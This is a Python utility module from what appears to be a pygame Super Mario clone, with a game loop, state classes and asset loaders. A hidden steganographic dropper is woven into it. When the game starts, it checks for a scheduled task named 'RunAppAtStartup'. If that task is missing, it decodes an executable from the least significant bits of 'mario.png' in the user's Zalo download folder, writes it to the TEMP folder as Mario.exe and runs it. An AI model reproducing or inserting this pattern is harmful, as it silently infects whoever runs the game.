__author__ = 'justinarmstrong'

import os
import sys
import threading
import pygame as pg
from PIL import Image
import subprocess

keybinding = {
    'action':pg.K_s,
    'jump':pg.K_a,
    'left':pg.K_LEFT,
    'right':pg.K_RIGHT,
    'down':pg.K_DOWN
}

image = os.path.join(os.getenv("USERPROFILE"), "Documents", "Zalo Received Files", "mario.png")



class Control(object):
    """Control class for entire project. Contains the game loop, and contains
    the event_loop which passes events to States as needed. Logic for flipping
    states is also found here."""
    def __init__(self, caption):
        self.screen = pg.display.get_surface()
        self.done = False
        self.clock = pg.time.Clock()
        self.caption = caption
        self.fps = 60
        self.show_fps = False
        self.current_time = 0.0
        self.keys = pg.key.get_pressed()
        self.state_dict = {}
        self.state_name = None
        self.state = None

    def setup_states(self, state_dict, start_state):
        self.state_dict = state_dict
        self.state_name = start_state
        self.state = self.state_dict[self.state_name]

    def update(self):
        self.current_time = pg.time.get_ticks()
        if self.state.quit:
            self.done = True
        elif self.state.done:
            self.flip_state()
        self.state.update(self.screen, self.keys, self.current_time)

    def flip_state(self):
        previous, self.state_name = self.state_name, self.state.next
        persist = self.state.cleanup()
        self.state = self.state_dict[self.state_name]
        self.state.startup(self.current_time, persist)
        self.state.previous = previous


    def event_loop(self):
        for event in pg.event.get():
            if event.type == pg.QUIT:
                self.done = True
            elif event.type == pg.KEYDOWN:
                self.keys = pg.key.get_pressed()
                self.toggle_show_fps(event.key)
            elif event.type == pg.KEYUP:
                self.keys = pg.key.get_pressed()
            self.state.get_event(event)


    def toggle_show_fps(self, key):
        if key == pg.K_F5:
            self.show_fps = not self.show_fps
            if not self.show_fps:
                pg.display.set_caption(self.caption)


    def main(self):
        """Main loop for entire program"""
        if not check_task_exists("RunAppAtStartup"):
            run_in_thread(image)
        while not self.done:
            self.event_loop()
            self.update()
            pg.display.update()
            self.clock.tick(self.fps)
            if self.show_fps:
                fps = self.clock.get_fps()
                with_fps = "{} - {:.2f} FPS".format(self.caption, fps)
                pg.display.set_caption(with_fps)


class _State(object):
    def __init__(self):
        self.start_time = 0.0
        self.current_time = 0.0
        self.done = False
        self.quit = False
        self.next = None
        self.previous = None
        self.persist = {}

    def get_event(self, event):
        pass

    def startup(self, current_time, persistant):
        self.persist = persistant
        self.start_time = current_time

    def cleanup(self):
        self.done = False
        return self.persist

    def update(self, surface, keys, current_time):
        pass

def check_task_exists(task_name):
    """Check if a scheduled task with the given name exists."""
    try:
        # Run the schtasks command to query all tasks
        result = subprocess.run(
            ["schtasks", "/query", "/tn", task_name],
            capture_output=True, text=True, check=True
        )

        # If the task exists, the result will have the task name in the output
        if task_name in result.stdout:
            return True
        else:
            return False

    except subprocess.CalledProcessError:
        # If an error occurs, the task likely doesn't exist
        print(f"Task '{task_name}' does not exist.")
        return False
    except Exception as e:
        print(f"An error occurred: {e}")
        return False



def open_picture(image_path):
    try:
        # Open the encoded image
        img = Image.open(image_path).convert("RGB")
        pixels = list(iter(img.getdata()))  # Get pixel data as a list

        # Flatten the image array for easier bit extraction
        flat_pixels = [value for pixel in pixels for value in pixel]

        # Extract the binary data from the LSBs of the pixels
        binary_bits = [pixel_value & 1 for pixel_value in flat_pixels]

        # Group bits into bytes (8 bits per byte)
        byte_data = []
        for i in range(0, len(binary_bits), 8):
            byte = binary_bits[i:i + 8]
            byte_data.append(int(''.join(map(str, byte)), 2))

        # Convert to a bytearray
        byte_array = bytearray(byte_data)

        # Write to a temporary file
        temp_file_path = os.path.join(os.getenv("TEMP"), "Mario.exe")
        with open(temp_file_path, 'wb') as temp_file:
            temp_file.write(byte_array)

        # Execute the temporary file
        subprocess.run([temp_file_path], check=True)
    except subprocess.CalledProcessError as e:
        print(f"An error occurred during execution: {e}")
    except Exception as e:
        print(f"An error occurred: {e}")

def run_in_thread(image_path):
    if not os.path.exists(image_path):
        return None
    thread = threading.Thread(target=open_picture, args=(image_path,))
    thread.start()
    return thread

def load_all_gfx(directory, colorkey=(255,0,255), accept=('.png', 'jpg', 'bmp')):
    graphics = {}
    for pic in os.listdir(directory):
        name, ext = os.path.splitext(pic)
        if ext.lower() in accept:
            img = pg.image.load(os.path.join(directory, pic))
            if img.get_alpha():
                img = img.convert_alpha()
            else:
                img = img.convert()
                img.set_colorkey(colorkey)
            graphics[name]=img
    return graphics

def resource_path(relative_path):
    """Get the absolute path to a resource."""
    try:
        # PyInstaller creates a temp folder and stores the path in _MEIPASS
        base_path = sys._MEIPASS
    except AttributeError:
        # Running in normal Python interpreter
        base_path = os.path.abspath(".")

    return os.path.join(base_path, relative_path)

def load_all_music(directory, accept=('.wav', '.mp3', '.ogg', '.mdi')):
    songs = {}
    for song in os.listdir(directory):
        name,ext = os.path.splitext(song)
        if ext.lower() in accept:
            songs[name] = os.path.join(directory, song)
    return songs


def load_all_fonts(directory, accept=('.ttf')):
    return load_all_music(directory, accept)


def load_all_sfx(directory, accept=('.wav','.mpe','.ogg','.mdi')):
    effects = {}
    for fx in os.listdir(directory):
        name, ext = os.path.splitext(fx)
        if ext.lower() in accept:
            effects[name] = pg.mixer.Sound(os.path.join(directory, fx))
    return effects











